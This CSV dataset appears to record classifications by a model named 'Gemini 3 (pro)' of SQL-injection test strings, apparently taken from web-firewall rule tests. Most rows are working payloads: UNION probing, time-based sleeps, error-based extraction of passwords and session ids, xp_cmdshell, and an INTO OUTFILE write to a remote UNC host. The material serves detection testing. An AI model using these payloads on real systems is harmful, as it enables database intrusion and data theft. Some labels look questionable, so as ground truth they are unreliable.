string,classification,Model
/?var=;INSERT INTO table (col) VALUES,MaliciousIntended-but-safe,Gemini 3 (pro)
/?var=;insertion_424242,Safe,Gemini 3 (pro)
"/?var=CREATE+FUNCTION+hello+(s+CHAR(20))+RETURNS+CHAR(50)+DETERMINISTIC+RETURN+CONCAT('Hello,+',s,'!');",Malicious-Unsafe,Gemini 3 (pro)
/?test=;truncate[xx,MaliciousIntended-but-safe,Gemini 3 (pro)
"var=1234 AS ""foobar"" FROM tablevar2=whatever",Malicious-Unsafe,Gemini 3 (pro)
selectChar(,MaliciousIntended-but-safe,Gemini 3 (pro)
SELECTGROUP_CONCAT(,MaliciousIntended-but-safe,Gemini 3 (pro)
selectload_file(,MaliciousIntended-but-safe,Gemini 3 (pro)
`AS`edit_user_id`from,Malicious-Unsafe,Gemini 3 (pro)
pay=`+REGEXP,MaliciousIntended-but-safe,Gemini 3 (pro)
`AS`OXTIMESTAMP`from,Malicious-Unsafe,Gemini 3 (pro)
(load_file(,MaliciousIntended-but-safe,Gemini 3 (pro)
`AS`documentType`FROM,Malicious-Unsafe,Gemini 3 (pro)
"6As""from",Malicious-Unsafe,Gemini 3 (pro)
",asidefrom",Safe,Gemini 3 (pro)
a=/create,Safe,Gemini 3 (pro)
a=/CREATETABLEPersons,Safe,Gemini 3 (pro)
Delete(Trashcan),Safe,Gemini 3 (pro)
34-delete,Safe,Gemini 3 (pro)
update,Safe,Gemini 3 (pro)
/select-quote,Safe,Gemini 3 (pro)
Update:After...,Safe,Gemini 3 (pro)
desc,Safe,Gemini 3 (pro)
a=/load.php,Safe,Gemini 3 (pro)
a=/update-assets,Safe,Gemini 3 (pro)
blablablaliveupdatechart,Safe,Gemini 3 (pro)
.select-gws-banana,Safe,Gemini 3 (pro)
blablabla.Asevidencefromthefollowingblablabla,Safe,Gemini 3 (pro)
"||(SELECT(DBMS_LDAP.INIT('169.1.1.1',19))FROM(DUAL))/investigate",Malicious-Unsafe,Gemini 3 (pro)
'||(select(pg_sleep(15))where(true))||'/investigate,Malicious-Unsafe,Gemini 3 (pro)
"UNIONALLSELECTNULL,NULL,CONCAT(CONCAT('qqkjq','mxTSrPILRz'),'qvxvq')--sqCV",Malicious-Unsafe,Gemini 3 (pro)
2020-03-01UNIONALLSELECTCONCAT,MaliciousIntended-but-safe,Gemini 3 (pro)
"x"";SELECTLOAD_FILE('",MaliciousIntended-but-safe,Gemini 3 (pro)
"-1UNIONSELECTnull,123456,null,null,null,null--",Malicious-Unsafe,Gemini 3 (pro)
"(CONVERT(INT,(SELECTCHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT(CASEWHEN(6557=6557",Malicious-Unsafe,Gemini 3 (pro)
")UNIONALLSELECTNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",Malicious-Unsafe,Gemini 3 (pro)
"1unionselect1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,CONCAT('vbulletin','rce',@@version)",Malicious-Unsafe,Gemini 3 (pro)
"(SELECT4440FROM(SELECTCOUNT(*),CONCAT(0x716b627a71,(SELECT(ELT(4440=4440,1))),0x7170716271,FLOOR",Malicious-Unsafe,Gemini 3 (pro)
"2759399466.1534185336-6863unionallselect1,1,1,1,1,1,1,1,1,CONCAT",MaliciousIntended-but-safe,Gemini 3 (pro)
'altera,MaliciousIntended-but-safe,Gemini 3 (pro)
ALTERA,MaliciousIntended-but-safe,Gemini 3 (pro)
'alter/,MaliciousIntended-but-safe,Gemini 3 (pro)
UNIONA,MaliciousIntended-but-safe,Gemini 3 (pro)
'UNIONA,MaliciousIntended-but-safe,Gemini 3 (pro)
'union/,MaliciousIntended-but-safe,Gemini 3 (pro)
)asccFROM,Malicious-Unsafe,Gemini 3 (pro)
)ASordersFROM,Malicious-Unsafe,Gemini 3 (pro)
)AS`carrier_id`from,Malicious-Unsafe,Gemini 3 (pro)
)ASRoleFROM,Malicious-Unsafe,Gemini 3 (pro)
)ASvalFROM,Malicious-Unsafe,Gemini 3 (pro)
)AS'Durchschnitt_Importzeit'FROM,Malicious-Unsafe,Gemini 3 (pro)
)ascol_0_0_from,Malicious-Unsafe,Gemini 3 (pro)
)AS`count`FROM,Malicious-Unsafe,Gemini 3 (pro)
)ASschlagwoerterFROM,Malicious-Unsafe,Gemini 3 (pro)
)asUserfrom,Malicious-Unsafe,Gemini 3 (pro)
)AStFROM,Malicious-Unsafe,Gemini 3 (pro)
)asExecuteTheseSQLCommandsFROM,Malicious-Unsafe,Gemini 3 (pro)
!As'from,MaliciousIntended-but-safe,Gemini 3 (pro)
;Asnotfrom,Malicious-Unsafe,Gemini 3 (pro)
)asday1FROM,Malicious-Unsafe,Gemini 3 (pro)
var='*from=1or'9,MaliciousIntended-but-safe,Gemini 3 (pro)
var='*from=1id'9,MaliciousIntended-but-safe,Gemini 3 (pro)
var='=#',MaliciousIntended-but-safe,Gemini 3 (pro)
var='?#=#,MaliciousIntended-but-safe,Gemini 3 (pro)
var='?#=--,MaliciousIntended-but-safe,Gemini 3 (pro)
var='orhomer9,MaliciousIntended-but-safe,Gemini 3 (pro)
var=^',MaliciousIntended-but-safe,Gemini 3 (pro)
"var=""`*12344",MaliciousIntended-but-safe,Gemini 3 (pro)
var=>foo##'.,MaliciousIntended-but-safe,Gemini 3 (pro)
from`db_miwf`.`sys_refindex`limit,Malicious-Unsafe,Gemini 3 (pro)
"from(selectcount(*),concat((select(select(selectconcat(0x53,0x65,0x61,0x72,0x63,0x68,0x43,0x6F,0x6C,0x65,0x63,0x74,0x6F,0x72)from`information_schema`.tableslimit",Malicious-Unsafe,Gemini 3 (pro)
from`information_schema`.tableslimit,Malicious-Unsafe,Gemini 3 (pro)
ORderby,Malicious-Unsafe,Gemini 3 (pro)
SELECT(CASE,Malicious-Unsafe,Gemini 3 (pro)
pay=FROM+termine+GROUP+BY+tag1&sql_delimit,Malicious-Unsafe,Gemini 3 (pro)
"SELECT6229FROM(SELECTCOUNT(*),CONCAT(0x717a786a71,(SELECT(CASE",Malicious-Unsafe,Gemini 3 (pro)
SELECTCHAR(113)+CHAR(122)+CHAR(120)+CHAR(106)+CHAR(113)+(SELECT(CASE,Malicious-Unsafe,Gemini 3 (pro)
SELECTUPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113)||(SELECT(CASE,Malicious-Unsafe,Gemini 3 (pro)
"SELECTCONCAT(0x717a786a71,(SELECT(CASE",Malicious-Unsafe,Gemini 3 (pro)
5desc,Malicious-Unsafe,Gemini 3 (pro)
SELECT(CHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113))||(SELECT(CASE,MaliciousIntended-but-safe,Gemini 3 (pro)
SELECTCHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113)||(SELECT(CASE,MaliciousIntended-but-safe,Gemini 3 (pro)
SELECT'qzxjq'||(SELECT(CASE,MaliciousIntended-but-safe,Gemini 3 (pro)
executephp,MaliciousIntended-but-safe,Gemini 3 (pro)
"from(selectcount(*),concat((select(select(SELECTconcat(user_name,0x7c,password)FROMecs_admin_userdesclimit",MaliciousIntended-but-safe,Gemini 3 (pro)
Execute(,MaliciousIntended-but-safe,Gemini 3 (pro)
"from+information_schema.tables+where+BINARY+LEFT(table_name,+1)+=+'nnn'+LIMIT",MaliciousIntended-but-safe,Gemini 3 (pro)
from+information_schema.tables+where+table_schema=database()+and+table_name+REGEXP+0x6d656d6265727324+limit,MaliciousIntended-but-safe,Gemini 3 (pro)
"fromtype=vBForum:SocialGroupMessage&do=process&contenttypeid=5&categoryid[]=-99)+union+select+salt+from+user+where+userid=1+and+row(1,1)>(select+count(*),concat(+(select+user.salt)+,0x3a,floor(rand(0)*2))+x+from+(select+1+union+select+2+union+select+3)a+group+by+x+limit",MaliciousIntended-but-safe,Gemini 3 (pro)
"from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit",MaliciousIntended-but-safe,Gemini 3 (pro)
HAVING+1=,MaliciousIntended-but-safe,Gemini 3 (pro)
execute+elysi,MaliciousIntended-but-safe,Gemini 3 (pro)
"FROM(SELECT+COUNT(*),CONCAT(0x716a766b71,(SELECT+(ELT(3419=3419,1))),0x7171717071,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)&limit",MaliciousIntended-but-safe,Gemini 3 (pro)
"FROM(SELECT+COUNT(*),CONCAT(0x716a766b71,(SELECT+(ELT(9184=9184,1))),0x7171717071,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)+AND+'%'='&limit",MaliciousIntended-but-safe,Gemini 3 (pro)
from(select(sleep(20)))a)'&data[Job][limit,MaliciousIntended-but-safe,Gemini 3 (pro)
from(select(sleep(20)))a)+'&data[Job][limit,MaliciousIntended-but-safe,Gemini 3 (pro)
from(select(sleep(20)))a)--+&data[Job][limit,MaliciousIntended-but-safe,Gemini 3 (pro)
from(select(sleep(20)))a)&data[Job][limit,MaliciousIntended-but-safe,Gemini 3 (pro)
"FROM+ack_variable+WHERE+name=""cron_last"";&sql_delimit",MaliciousIntended-but-safe,Gemini 3 (pro)
executenode_,MaliciousIntended-but-safe,Gemini 3 (pro)
executescald,MaliciousIntended-but-safe,Gemini 3 (pro)
executesystem,MaliciousIntended-but-safe,Gemini 3 (pro)
executeuser_,MaliciousIntended-but-safe,Gemini 3 (pro)
executeviews,MaliciousIntended-but-safe,Gemini 3 (pro)
executepatha,MaliciousIntended-but-safe,Gemini 3 (pro)
executeworkb,MaliciousIntended-but-safe,Gemini 3 (pro)
executepanel,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=from+information_schema.tables+where+1=2+limit,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=FROM+%60oxattribute%60+WHERE+CONVERT%28%60oxattribute%60.%60OXID%60+USING+utf8%29+%3D+%27n550a1cee455b9ce585343d75d112b77%27+LIMIT,MaliciousIntended-but-safe,Gemini 3 (pro)
"pay=FROM(select+count(*),concat((select+(select+concat(session_id))+FROM+jml_session+LIMIT",MaliciousIntended-but-safe,Gemini 3 (pro)
pay=SELECT+dDJq+WHERE+9896=9896;SELECT+(CASE,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=FROM+`we_tblErrorLog`+WHERE+`we_tblErrorLog`.`ID`+=+25251+LIMIT,MaliciousIntended-but-safe,Gemini 3 (pro)
"pay=FROM+`dates`+order+by+`uname`,+`date`,+`load`&dummy=`uname`&dummy=`datum`&dummy=`laden`&sql_delimit",MaliciousIntended-but-safe,Gemini 3 (pro)
"pay=IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))",MaliciousIntended-but-safe,Gemini 3 (pro)
/?var=sdfsd'or 1 > 1,MaliciousIntended-but-safe,Gemini 3 (pro)
and'5'orig_var_datavarname=whatever,MaliciousIntended-but-safe,Gemini 3 (pro)
and7oranges,Safe,Gemini 3 (pro)
ABS(,Safe,Gemini 3 (pro)
benchmark(,MaliciousIntended-but-safe,Gemini 3 (pro)
cast(,Safe,Gemini 3 (pro)
char(,Safe,Gemini 3 (pro)
chr(,Safe,Gemini 3 (pro)
COALESCE(,Safe,Gemini 3 (pro)
Compress(,Safe,Gemini 3 (pro)
concat(,Safe,Gemini 3 (pro)
concat_ws(,Safe,Gemini 3 (pro)
convert(,Safe,Gemini 3 (pro)
COS(,Safe,Gemini 3 (pro)
COUNT(,Safe,Gemini 3 (pro)
date(,Safe,Gemini 3 (pro)
pay=date]=(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=day.+(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=day&'(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=decode(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=default(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=ELT(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=encode=(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=ExtractValue(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=floor(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=FLOOR+(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=format(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=GROUP_CONCAT(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=hex(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=if+!(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=if+(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=if(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=if\(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=IFNULL(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=in+'$(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=IN+(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=IN/**/(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=insert(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=left')?$(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=LEFT(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=length||!!$(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=length||(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=length?(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=length&&!!!$(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=length&&(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=LENGTH(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=ln+(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=ln)+(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=load_file(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=local(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=log(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=log&&(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=lower(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=MAKE_SET(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=MAX(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=md5(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=md5\(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=MID(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=minute+(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=month=(,MaliciousIntended-but-safe,Gemini 3 (pro)
name_const(,MaliciousIntended-but-safe,Gemini 3 (pro)
now(,Safe,Gemini 3 (pro)
ord(,Safe,Gemini 3 (pro)
password?(,MaliciousIntended-but-safe,Gemini 3 (pro)
password/?(,MaliciousIntended-but-safe,Gemini 3 (pro)
Password>$(,MaliciousIntended-but-safe,Gemini 3 (pro)
pg_sleep(,MaliciousIntended-but-safe,Gemini 3 (pro)
pi(,Safe,Gemini 3 (pro)
pow(,Safe,Gemini 3 (pro)
quarter.(,Safe,Gemini 3 (pro)
rand(,Safe,Gemini 3 (pro)
replace(,Safe,Gemini 3 (pro)
round(,Safe,Gemini 3 (pro)
rtrim(,Safe,Gemini 3 (pro)
pay=sin(,Safe,Gemini 3 (pro)
SIN(,Safe,Gemini 3 (pro)
pay=sleep(,MaliciousIntended-but-safe,Gemini 3 (pro)
SLEEP(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=strcmp(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=substr(,MaliciousIntended-but-safe,Gemini 3 (pro)
SUBSTR(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=substring(,MaliciousIntended-but-safe,Gemini 3 (pro)
SUBSTRING(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=sysdate(,Safe,Gemini 3 (pro)
time(,Safe,Gemini 3 (pro)
pay=time(,Safe,Gemini 3 (pro)
pay=trim(,Safe,Gemini 3 (pro)
pay=Uncompress+(,Safe,Gemini 3 (pro)
pay=unhex(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=updatexml(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=UPPER(,Safe,Gemini 3 (pro)
pay=user+(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=user/?(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=user(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=values+(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=VALUES(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=version=(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=version(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=xmltype(,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=year]=(,MaliciousIntended-but-safe,Gemini 3 (pro)
var=(((((())))))&var2=whatever,Safe,Gemini 3 (pro)
var=-------------------&var2=whatever,Safe,Gemini 3 (pro)
var=;;ddfoobar,MaliciousIntended-but-safe,Gemini 3 (pro)
/post?var=DROP sampletable;--,MaliciousIntended-but-safe,Gemini 3 (pro)
test='or1=1;,MaliciousIntended-but-safe,Gemini 3 (pro)
test=OR1#,MaliciousIntended-but-safe,Gemini 3 (pro)
test=admin'--,MaliciousIntended-but-safe,Gemini 3 (pro)
test=DROP/*comment*/sampletable,MaliciousIntended-but-safe,Gemini 3 (pro)
test=DR/**/OP/*bypassdenylisting*/sampletable,MaliciousIntended-but-safe,Gemini 3 (pro)
test=SELECT/*avoid-spaces*/password/**/FROM/**/Members,Malicious-Unsafe,Gemini 3 (pro)
"test=SELECT/*!323021/0,*/1FROMtablename",MaliciousIntended-but-safe,Gemini 3 (pro)
test='or1=1#,MaliciousIntended-but-safe,Gemini 3 (pro)
test=‘or1=1---,MaliciousIntended-but-safe,Gemini 3 (pro)
test=‘or1=1/*,MaliciousIntended-but-safe,Gemini 3 (pro)
test=1='1'or---,MaliciousIntended-but-safe,Gemini 3 (pro)
test='/*!50000or*/1='1,MaliciousIntended-but-safe,Gemini 3 (pro)
test='/*!or*/1='1,MaliciousIntended-but-safe,Gemini 3 (pro)
test=0/**/union/*!50000select*/table_name`foo`/**/,MaliciousIntended-but-safe,Gemini 3 (pro)
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c,Safe,Gemini 3 (pro)
foo=bar,Safe,Gemini 3 (pro)
/callback?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c,Safe,Gemini 3 (pro)
/get/?fbclid=IwAR1dug0BYxe0ukhZ2vKrdQwLAxVFRJ--Q2Y7OBJE_0uId9-Eh-sJWLdVk2E,Safe,Gemini 3 (pro)
/get/?gclid=j0KCQiA1NebBhDDARIsAANiDD3_RJeMv8zScF--mC1jf8fO8PDYJCxD9xdwT7iQ59QIIwL-86ncQtMaAh0lEALw_wcB,Safe,Gemini 3 (pro)
var=\0xf00dsdfdsa,Safe,Gemini 3 (pro)
"var=concat(0x223e3c62723e,version(),0x3c696d67207372633d22)",MaliciousIntended-but-safe,Gemini 3 (pro)
var=select 0x616263,Malicious-Unsafe,Gemini 3 (pro)
var=IHRlc3Q0xAcF,Safe,Gemini 3 (pro)
var=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08,Safe,Gemini 3 (pro)
var=foo....,Safe,Gemini 3 (pro)
var=foo...,Safe,Gemini 3 (pro)
pay=nvarchar,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=xp_cmdshell,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=varchar,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=xp_dirtree,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=xp_regread,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=sp_password,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=UTL_HTTP,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=OPENROWSET,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=sp_executesql,MaliciousIntended-but-safe,Gemini 3 (pro)
sp_executesql,MaliciousIntended-but-safe,Gemini 3 (pro)
/index.php?id=1+current_user::int,MaliciousIntended-but-safe,Gemini 3 (pro)
/?'msdasql',MaliciousIntended-but-safe,Gemini 3 (pro)
var=EmptyValueintooutfile'\\\\jviw6aoxefbjk0luyi6oiwjv5unittests.coreruleset.org\\xct';--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=/config.ini'intooutfile'\\\\il7vw9ew4e1iazbtohwn8v9uvl1hunitetests.coreruleset.org\\yxq';--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=0.3480567293179807'UNIONALLselectNULL--,MaliciousIntended-but-safe,Gemini 3 (pro)
"var=config.ini"")UNIONALLselectNULL--",MaliciousIntended-but-safe,Gemini 3 (pro)
var=CRS)UNIONALLselectNULL--,MaliciousIntended-but-safe,Gemini 3 (pro)
"var=CRS3"")UNIONALLselectNULL--",MaliciousIntended-but-safe,Gemini 3 (pro)
/index.php?id=overlay(password placing '' from 1 for 0)::int,MaliciousIntended-but-safe,Gemini 3 (pro)
/index.php?id=overlay(password,MaliciousIntended-but-safe,Gemini 3 (pro)
placing,MaliciousIntended-but-safe,Gemini 3 (pro)
'',Safe,Gemini 3 (pro)
from 1 for 0)::int,MaliciousIntended-but-safe,Gemini 3 (pro)
"var=""` * 123",MaliciousIntended-but-safe,Gemini 3 (pro)
"'',10",Safe,Gemini 3 (pro)
"'','','','','','','','',13",MaliciousIntended-but-safe,Gemini 3 (pro)
`>65,MaliciousIntended-but-safe,Gemini 3 (pro)
pay='1001'='10,MaliciousIntended-but-safe,Gemini 3 (pro)
2562*23,MaliciousIntended-but-safe,Gemini 3 (pro)
"pay="":[""00",MaliciousIntended-but-safe,Gemini 3 (pro)
pay=`>6fbdec2,MaliciousIntended-but-safe,Gemini 3 (pro)
"pay='][0]]),strtolower($b[$GLOBALS['",MaliciousIntended-but-safe,Gemini 3 (pro)
"pay=',2,1",MaliciousIntended-but-safe,Gemini 3 (pro)
`>9e7,MaliciousIntended-but-safe,Gemini 3 (pro)
"pay="":""65",MaliciousIntended-but-safe,Gemini 3 (pro)
pay='\2nq5,MaliciousIntended-but-safe,Gemini 3 (pro)
pay=`<0)AND`,MaliciousIntended-but-safe,Gemini 3 (pro)
pay='0:0:6,Safe,Gemini 3 (pro)
:60,Safe,Gemini 3 (pro)
"pay="">%5-type_submit_reset_5",MaliciousIntended-but-safe,Gemini 3 (pro)
:35,Safe,Gemini 3 (pro)
pay='3085'='30,MaliciousIntended-but-safe,Gemini 3 (pro)
":""""[0,\x22",MaliciousIntended-but-safe,Gemini 3 (pro)
pay='16/17,MaliciousIntended-but-safe,Gemini 3 (pro)
""""";}7b6",MaliciousIntended-but-safe,Gemini 3 (pro)
/?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0},MaliciousIntended-but-safe,Gemini 3 (pro)
/?id=9999+or+{if+length((/*+!5000select+username/*!50000from*/user+where+id=1))>0},MaliciousIntended-but-safe,Gemini 3 (pro)
/get?test=9999+or+/*+optimizer+hint+*/+true,MaliciousIntended-but-safe,Gemini 3 (pro)
/get?test=9999+or+/*++optimizer+hint+*/+true,MaliciousIntended-but-safe,Gemini 3 (pro)
/?test=9999+or+{if+length((/*!5000select+username/*!comment*/,MaliciousIntended-but-safe,Gemini 3 (pro)
/?`bla`,MaliciousIntended-but-safe,Gemini 3 (pro)
/?'bla',MaliciousIntended-but-safe,Gemini 3 (pro)
var=id'is not-id--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=id'is notes,MaliciousIntended-but-safe,Gemini 3 (pro)
var=id'not like id--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=id'not glob-id--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'|email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'-email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'%2Bemail--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'^email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'@email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'&email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'<email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'>email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'=email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'/email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'%email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x'~email--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=x' mod id--,MaliciousIntended-but-safe,Gemini 3 (pro)
var='sounds like rowid--,MaliciousIntended-but-safe,Gemini 3 (pro)
var='/**/*2--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=foo'or'oof,MaliciousIntended-but-safe,Gemini 3 (pro)
var=foo\''or'oof,MaliciousIntended-but-safe,Gemini 3 (pro)
email=' is not?--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=a'or'a,MaliciousIntended-but-safe,Gemini 3 (pro)
var=a'or?--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=is this your parents' or yours?,MaliciousIntended-but-safe,Gemini 3 (pro)
var=user'and id is not?--,MaliciousIntended-but-safe,Gemini 3 (pro)
var=it is your parents' and yours,Safe,Gemini 3 (pro)
var=bob's or alice's,MaliciousIntended-but-safe,Gemini 3 (pro)
var=mother or daughter,Safe,Gemini 3 (pro)
var='oreo,MaliciousIntended-but-safe,Gemini 3 (pro)
var='fork,MaliciousIntended-but-safe,Gemini 3 (pro)
var=' for,MaliciousIntended-but-safe,Gemini 3 (pro)
var=''or,MaliciousIntended-but-safe,Gemini 3 (pro)
var='''or 1,MaliciousIntended-but-safe,Gemini 3 (pro)
var=\'lol' or '1,MaliciousIntended-but-safe,Gemini 3 (pro)
' OR '1'='1,MaliciousIntended-but-safe,Gemini 3 (pro)
' OR '1'='1' --,MaliciousIntended-but-safe,Gemini 3 (pro)
' OR '1'='1' {,MaliciousIntended-but-safe,Gemini 3 (pro)
' OR '1'='1' /* ,MaliciousIntended-but-safe,Gemini 3 (pro)
